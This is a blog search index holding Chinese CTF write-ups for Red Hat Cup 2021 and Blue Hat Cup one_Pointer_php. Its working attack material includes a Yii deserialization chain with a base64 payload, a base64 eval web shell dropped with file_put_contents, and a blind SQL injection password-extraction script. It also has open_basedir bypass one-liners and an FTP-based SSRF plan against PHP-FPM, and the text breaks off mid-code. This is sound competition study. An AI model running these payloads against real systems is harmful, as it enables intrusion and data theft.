<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2021红帽杯WP</title>
      <link href="2021/05/11/2021%E7%BA%A2%E5%B8%BD%E6%9D%AFWP/"/>
      <url>2021/05/11/2021%E7%BA%A2%E5%B8%BD%E6%9D%AFWP/</url>
      
        <content type="html"><![CDATA[<h2 id="MISC-签到"><a href="#MISC-签到" class="headerlink" title="[MISC]签到"></a>[MISC]签到</h2><p><a href="http://www.longpelaexpertise.com.au/toolsCode.php">http://www.longpelaexpertise.com.au/toolsCode.php</a></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210509102244837.png" alt="image-20210509102244837"></p><h2 id="WEB-find-it"><a href="#WEB-find-it" class="headerlink" title="[WEB]find it"></a>[WEB]find it</h2><p><code>robots.txt</code></p><p><code>.1ndexx.php.swp</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $link &#x3D; mysql_connect(&#39;localhost&#39;, &#39;root&#39;); ?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"> &lt;title&gt;Hello worldd!&lt;&#x2F;title&gt;</span><br><span class="line"> &lt;style&gt;</span><br><span class="line"> body &#123;</span><br><span class="line">  background-color: white;</span><br><span class="line">  text-align: center;</span><br><span class="line">  padding: 50px;</span><br><span class="line">  font-family: &quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> #logo &#123;</span><br><span class="line">  margin-bottom: 40px;</span><br><span class="line"> &#125;</span><br><span class="line"> &lt;yle&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt; img id&#x3D;&quot;logo&quot; src&#x3D;&quot;logo.png&quot; &#x2F;&gt;</span><br><span class="line"> &lt;h1&gt;&lt;?php echo &quot;Hello My freind!&quot;; ?&gt;&lt;&#x2F;h1&gt;</span><br><span class="line"> &lt;?php if($link) &#123; ?&gt;</span><br><span class="line">  &lt;h2&gt;I Can&#39;t view my php files?!&lt;&#x2F;h2&gt;</span><br><span class="line"> &lt;?php &#125; else &#123; ?&gt;</span><br><span class="line">  &lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;&#x2F;h2&gt;</span><br><span class="line"> &lt;?php &#125; ?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;ml&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">#Really easy...</span><br><span class="line"></span><br><span class="line">$file&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);</span><br><span class="line"></span><br><span class="line">$I_know_you_wanna_but_i_will_not_give_you_hhh &#x3D; fread($file,filesize(&quot;flag.php&quot;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hack&#x3D;fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);</span><br><span class="line"></span><br><span class="line">$a&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line"></span><br><span class="line">if(preg_match(&#39;&#x2F;system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\&#96;|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump&#x2F;&#39;,$a))&#123;</span><br><span class="line"> die(&quot;you die&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(strlen($a)&gt;33)&#123;</span><br><span class="line"> die(&quot;nonono.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">fwrite($hack,$a);</span><br><span class="line">fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);</span><br><span class="line"></span><br><span class="line">fclose($file);</span><br><span class="line">fclose($hack);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>直接写入phpinfo：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2zeab1jn4vnk02hulykm.cloudeci1.ichunqiu.com&#x2F;1ndexx.php?code&#x3D;&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>然后访问hack.php：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2zeab1jn4vnk02hulykm.cloudeci1.ichunqiu.com&#x2F;hack.php</span><br></pre></td></tr></table></figure><p>PHPINFO页面 找到flag</p><h2 id="WEB-framework"><a href="#WEB-framework" class="headerlink" title="[WEB]framework"></a>[WEB]framework</h2><p>存在WWW.ZIP源码泄露</p><p><a href="https://www.anquanke.com/post/id/217930">https://www.anquanke.com/post/id/217930</a></p><p>三条链子都可以用。看下phpinfo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 这里需要改为isRunning</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$description</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$keys</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> See;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;axin&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;is&quot;</span>=&gt;<span class="string">&quot;handsome&quot;</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成poc</span></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2ze8j3xqhbs4r48k0oky.cloudeci1.ichunqiu.com&#x2F;index.php?r&#x3D;site%2Fabout&amp;message&#x3D;TzoyNzoiU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlIjoyOntzOjMzOiIAU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlAGtleXMiO2E6MTp7czo0OiJheGluIjthOjE6e3M6MjoiaXMiO3M6ODoiaGFuZHNvbWUiO319czozMzoiAFN3aWZ0X0tleUNhY2hlX0Rpc2tLZXlDYWNoZQBwYXRoIjtPOjQyOiJwaHBEb2N1bWVudG9yXFJlZmxlY3Rpb25cRG9jQmxvY2tcVGFnc1xTZWUiOjE6e3M6MTQ6IgAqAGRlc2NyaXB0aW9uIjtPOjE1OiJGYWtlclxHZW5lcmF0b3IiOjE6e3M6MTM6IgAqAGZvcm1hdHRlcnMiO2E6MTp7czo2OiJyZW5kZXIiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjEwOiJwaHBpbmZvKCk7Ijt9aToxO3M6MzoicnVuIjt9fX19fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>可以看phpinfo 关键是绕过:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl,mail,putenv,error_log,error_reporting,unset,unlink,return</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.anquanke.com/post/id/170681">https://www.anquanke.com/post/id/170681</a></p><p>写shell绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;file_put_contents(&quot;v.php&quot;, base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1Rbdl0pOz8+&quot;));&#x27;</span>;&#125;</span><br></pre></td></tr></table></figure><p>蚁剑连接：绕过disable functions</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210509154116325.png" alt="image-20210509154116325"></p><h2 id="WEB-WebsiteManger"><a href="#WEB-WebsiteManger" class="headerlink" title="[WEB]WebsiteManger"></a>[WEB]WebsiteManger</h2><p>登陆页面，图片存在注入，注入得到用户名、密码 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">req = requests.session()</span><br><span class="line">string = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">50</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">    url = <span class="string">&quot;http://eci-2zeebn8ci69dx3qyic2l.cloudeci1.ichunqiu.com/image.php?id=&quot;</span></span><br><span class="line">    payload = <span class="string">&quot;if(ascii(substr((select/**/group_concat(password)from(users)),%d,1))=(%s),1,0)&quot;</span>%(i,<span class="built_in">ord</span>(j))</span><br><span class="line">    r = req.get(url+payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;JFIF&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">      res += j</span><br><span class="line">      <span class="built_in">print</span>(res)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"><span class="comment">#admin</span></span><br><span class="line"><span class="comment">#05b0176855ad7f3e7d9ac</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>登陆后 file协议读取flag即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;flag</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210509142022116.png" alt="image-20210509142022116"></p><h2 id="WEB-ezlight"><a href="#WEB-ezlight" class="headerlink" title="[WEB]ezlight"></a>[WEB]ezlight</h2><p>0day– gml yyds</p><h2 id="Crypto-primegame"><a href="#Crypto-primegame" class="headerlink" title="[Crypto]primegame"></a>[Crypto]primegame</h2><p><a href="http://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/">http://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/</a></p><h2 id="Crypto-hpcurve"><a href="#Crypto-hpcurve" class="headerlink" title="[Crypto]hpcurve"></a>[Crypto]hpcurve</h2><p><a href="https://jsur.in/posts/2020-12-21-hxp-ctf-2020-hyper-writeup">https://jsur.in/posts/2020-12-21-hxp-ctf-2020-hyper-writeup</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第五届蓝帽杯-one_Pointer_php复现</title>
      <link href="2021/05/03/%E7%AC%AC%E4%BA%94%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF-one_Pointer_php%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/05/03/%E7%AC%AC%E4%BA%94%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF-one_Pointer_php%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="第五届蓝帽杯-one-Pointer-php复现"><a href="#第五届蓝帽杯-one-Pointer-php复现" class="headerlink" title="第五届蓝帽杯-one_Pointer_php复现"></a>第五届蓝帽杯-one_Pointer_php复现</h2><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210503172438733.png" alt="image-20210503172438733"></p><p>很有意思的一道题目，只有北邮的大佬解出来了。</p><h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>下载源码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line"><span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line"><span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现会对COOKIE的data值进行反序列化，满足条件才可以调用backdoor</p><p>关键点在<code>if($count[]=1)</code> 需要让其返回false才能跳出if循环，利用 long类型最大值绕过：即整数溢出</p><blockquote><p><em>传入的数组键名超过PHP最大数字时，就会溢出为0</em></p></blockquote><p>当溢出为0，赋值语句返回false。</p><p>构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$v</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$v</span>-&gt;count=<span class="string">&quot;9223372036854775806&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$v</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$v</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:1:&#123;s:5:&quot;count&quot;;s:19:&quot;9223372036854775806&quot;;&#125;</span><br><span class="line">O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bs%3A19%3A%229223372036854775806%22%3B%7D</span><br></pre></td></tr></table></figure><p>伪造Cookie，看下phpinfo：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210501130240146.png" alt="image-20210501130240146"></p><p>php版本7.4 ，同时发现需要bypas disable_functions，想到FFI bypass。</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210501130434720.png" alt="image-20210501130434720"></p><p>尝试了各种bypas disable_functions 都不可以。。。。。</p><h3 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h3><p>绕过open_basedir 看下flag位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&#39;&#x2F;tmp&#39;);mkdir(&#39;vvv&#39;);chdir(&#39;vvv&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(ini_get(&#39;open_basedir&#39;));var_dump(glob(&#39;*&#39;));</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210501130608148.png" alt="image-20210501130608148"></p><p>flag在根目录下，读取失败，但是可以读取其他任意文件，看下文件权限：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210501130721465.png" alt="image-20210501130721465"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210501131329517.png" alt="image-20210501131329517"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210501131351943.png" alt="image-20210501131351943"></p><p>可见flag文件700权限，可见限制了/flag文件的权限，无法读取</p><p>尝试读取下php配置文件：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210501131827516.png" alt="image-20210501131827516"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210501132229509.png" alt="image-20210501132229509"></p><p>FFI bypass不能利用。发现有个so文件：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210501132321578.png" alt="image-20210501132321578"></p><p>猜测预期解应该是pwn这个so文件 bypass。</p><h3 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h3><p>通过测试发现可以写入任意文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backdoor&#x3D;chdir(&#39;&#x2F;tmp&#39;);mkdir(&#39;vvv&#39;);chdir(&#39;vvv&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(ini_get(&#39;open_basedir&#39;));file_put_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;v.php&#39;,&#39;testetsttetst&#39;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210503162946719.png" alt="image-20210503162946719"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backdoor&#x3D;chdir(&#39;&#x2F;tmp&#39;);mkdir(&#39;vvv&#39;);chdir(&#39;vvv&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(ini_get(&#39;open_basedir&#39;));var_dump(file_get_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;v.php&#39;));</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210503163022422.png" alt="image-20210503163022422"></p><h3 id="攻击PHP-FPM"><a href="#攻击PHP-FPM" class="headerlink" title="攻击PHP-FPM"></a>攻击PHP-FPM</h3><p>通过phpinfo发现是fastcgi ，读配置文件：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210501133821745.png" alt="image-20210501133821745"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;default</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210503123700888.png" alt="image-20210503123700888"></p><p>可见php-fpm监听在本地的9001端口。这样就可以尝试攻击FPM来RCE。</p><p>但是现在需要找到一个类似Gopher的协议，来实现SSRF 攻击FPM。</p><h3 id="SSRF-via-file-put-contents"><a href="#SSRF-via-file-put-contents" class="headerlink" title="SSRF via file_put_contents"></a>SSRF via file_put_contents</h3><p>前边我们说到可以任意文件写入，那么就可以利用<code> file_put_contents</code> 函数，用法在<a href="https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/">hxp CTF</a>已经考察过。思路是，通过任意文件写入一个file_put_contents函数到php文件，然后配合FTP实现SSRF</p><blockquote><p>FTP有两种使用模式：主动和被动。主动模式要求客户端和服务器端同时打开并且监听一个端口以创建连接。在这种情况下，客户端由于安装了防火墙会产生一些问题。所以，创立了被动模式。被动模式只要求服务器端产生一个监听相应端口的进程，这样就可以绕过客户端安装了防火墙的问题。</p><p>非常重要的一点, 这个被动模式的端口是服务器指定的, 而且还有一点是很多地方没有提到的, 实际上除了端口, 服务器的地址也是可以被指定的.</p></blockquote><blockquote><p> file_put_contents 在使用 ftp 协议时, 会将 data 的内容上传到 ftp 服务器, 由于上面说的 pasv 模式下, 服务器的地址和端口是可控, 我们可以将地址和端口指到 127.0.0.1:9000. 同时由于 ftp 的特性, 不会有任何的多余内容, 类似 gopher 协议, 会将 data 原封不动的发给 127.0.0.1:9000, 完美符合攻击 fastcgi 的要求.</p></blockquote><p>之后利用file_put_contents函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;ftp:&#x2F;&#x2F;vps:port&#x2F;anything&amp;data&#x3D;&#123;fastcgi payload&#125;</span><br></pre></td></tr></table></figure><p>因为ftp的地址和端口是我们可控的，指定为本地的9001端口，也就是FPM的监听端口，因此构造的攻击fastcgi payload会发送到FPM 达到攻击的目的。</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>按照<code>Ha1c9on</code>师傅的思路是通过加载so文件的方式攻击fastcgi。</p><h4 id="构造恶意ftp服务器"><a href="#构造恶意ftp服务器" class="headerlink" title="构造恶意ftp服务器"></a>构造恶意ftp服务器</h4><p>构造恶意ftp服务器，指定地址为本地的9001端口，结合file_put_contents达到SSRF的目的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span 